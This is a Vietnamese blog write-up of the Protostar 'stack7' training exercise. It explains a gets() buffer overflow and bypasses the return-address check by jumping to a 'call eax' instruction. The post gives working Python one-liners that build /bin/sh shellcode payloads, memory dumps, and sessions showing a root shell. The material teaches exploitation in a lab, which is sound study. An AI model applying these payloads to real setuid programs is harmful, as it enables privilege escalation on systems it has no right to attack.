---
layout: post
title: stack7
---
Trong bài này, giới hạn `eip` của caller cao hơn bài trước.
Bạn không thể chọn `eip` có dạng `0xb???????`, do đó, chỉ có thể return về lệnh trong phần chính (.text trong asm) của chương trình.
Phương pháp ROP giới thiệu trong bài trước vẫn có nguyên giá trị trong bài này.
Hãy tham khảo đáp ở cuối bài.
Sau đây là source code và asm code.
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

```asm
0x080484c4 <getpath+0>: push   ebp
0x080484c5 <getpath+1>: mov    ebp,esp
0x080484c7 <getpath+3>: sub    esp,0x68
0x080484ca <getpath+6>: mov    eax,0x8048620
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:        and    eax,0xb0000000
0x080484fd <getpath+57>:        cmp    eax,0xb0000000
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    eax,0x8048634
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    eax,0x8048640
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave
0x08048544 <getpath+128>:       ret
0x08048545 <main+0>:    push   ebp
0x08048546 <main+1>:    mov    ebp,esp
0x08048548 <main+3>:    and    esp,0xfffffff0
0x0804854b <main+6>:    call   0x80484c4 <getpath>
0x08048550 <main+11>:   mov    esp,ebp
0x08048552 <main+13>:   pop    ebp
0x08048553 <main+14>:   ret
```
Một kỹ thuật mới dựa vào lệnh `call`/`jmp` register để exploit sẽ được giới thiệu trong bài này.
Nguyên lý của phương pháp là điều chỉnh các register như `eax`, `ebx`, etc. rồi dùng các lệnh điều hướng `call`, `jmp`, etc. để tìm đến đoạn code mong muốn.
Cụ thế trong stack7, hàm `getpath` có trả về giá trị và giá trị này là kết quả của hàm `strdup` với `buffer` là tham số.
Như vậy ta biết, nội dung của `buffer` sẽ được sao chép vào một vị trí khác trên bộ nhớ và `strdup` trả về địa chỉ đó vào register `eax`, ngay trước khi thoát hàm.
Ta cũng biết rằng `buffer` chứa injected code, do vậy bản sao của nó qua `strdup` cũng sẽ chứa đoạn code này.
Việc điều hướng bằng `call eax` hay `jmp eax` sẽ exploit thành công chương trình.

Trước tiên ta cần tìm đúng lệnh `call eax` có sẵn trong phần .text của stack7.
Bạn có thể dùng objdump và grep như sau:
```bash
objdump -d /opt/protostar/bin/stack7 | grep "call"
```
Sau đó lọc ra một lệnh `call eax` với địa chỉ khác với dạng `0xb???????`.
Có 2 lệnh như vậy trong stack7, tại địa chỉ `0x080484bf` và `0x080485eb`.
Việc tiếp theo, chúng ta sẽ tính toán giá trị cho `buffer` để exploit chương trình như sau:
```bash
python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 16 + '\xbf\x84\x04\x08'" > input.txt
```
Giá trị này bao gồm 64 byte mong đợi của `buffer`, trong đó 36 byte đầu là `nop` cho NOP-sled và 28 byte còn lại cho injected code.
4 byte tiếp theo ghi đè lên biến `ret`.
8 byte tiếp theo dành cho padding.
4 byte tiếp theo dành cho `ebp` của caller.
4 byte cuối cùng là địa chỉ phù hợp, `0x080484bf`, để ghi đè `eip` của caller và điều hướng chương trình về lệnh `call eax`.
Sau đây là bộ nhớ trước và sau hàm `gets`.
Phân biệt <span style="color:aqua">buffer</span> và <span style="color:orangered">eip mới của caller</span>.
<pre class="memory">
0xbffff710:     0xbffff72c      0x00000000      0xb7fe1b28      0x00000001
0xbffff720:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xb7f0186e</span>
0xbffff730:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0xb7ec6165</span>      <span style="color:aqua">0xbffff748</span>      <span style="color:aqua">0xb7eada75</span>
0xbffff740:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x0804973c</span>      <span style="color:aqua">0xbffff758</span>      <span style="color:aqua">0x08048380</span>
0xbffff750:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804973c</span>      <span style="color:aqua">0xbffff788</span>      <span style="color:aqua">0x08048589</span>
0xbffff760:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048570</span>      0xbffff788
0xbffff770:     0xb7ec6365      0xb7ff1040      0xbffff788      <span style="color:orangered">0x08048550</span>
</pre>
<pre class="memory">
0xbffff710:     0xbffff72c      0x00000000      0xb7fe1b28      0x00000001
0xbffff720:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0x90909090</span>
0xbffff730:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
0xbffff740:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
0xbffff750:     <span style="color:aqua">0x6850c031</span>      <span style="color:aqua">0x68732f2f</span>      <span style="color:aqua">0x69622f68</span>      <span style="color:aqua">0x89e3896e</span>
0xbffff760:     <span style="color:aqua">0xb0c289c1</span>      <span style="color:aqua">0x3180cd0b</span>      <span style="color:aqua">0x80cd40c0</span>      0x90909090
0xbffff770:     0x90909090      0x90909090      0x90909090      <span style="color:orangered">0x080484bf</span>
</pre>
Sau đây là chuỗi chương trình được ghép lại để bạn dễ hình dung.
<pre class="memory">
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
...
0x08048543 <getpath+127>:       leave
0x08048544 <getpath+128>:       ret
<span style="color:orangered">0x80484bf <frame_dummy+31>:     call   eax</span>
<span style="color:springgreen">0x????????:     nop</span>
<span style="color:springgreen">0x????????:     nop</span>
<span style="color:springgreen">0x????????:     nop</span>
<span style="color:springgreen">0x????????:     nop</span>
...
<span style="color:springgreen">0x????????:     xor    eax,eax</span>
<span style="color:springgreen">0x????????:     push   eax</span>
<span style="color:springgreen">0x????????:     push   0x68732f2f</span>
<span style="color:springgreen">0x????????:     push   0x6e69622f</span>
<span style="color:springgreen">0x????????:     mov    ebx,esp</span>
...
</pre>
Đáp án và kết quả hãy tham khảo ở cuối bài.

## Ref
```bash
user@protostar:~$ python -c "print 'ABC\x00' + '\x90' * 32 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 16 + '\x44\x85\x04\x08' + '\x60\xf7\xff\xbf'" > input.txt
user@protostar:~$ (cat input.txt ; cat) | stack7
input path please: got path ABC
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

```
```bash
user@protostar:~$ python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 16 + '\xbf\x84\x04\x08'" > input.txt
user@protostar:~$ (cat input.txt ; cat) | stack7
input path please: got path ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒▒°
                                                                                 ̀1▒@̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

```
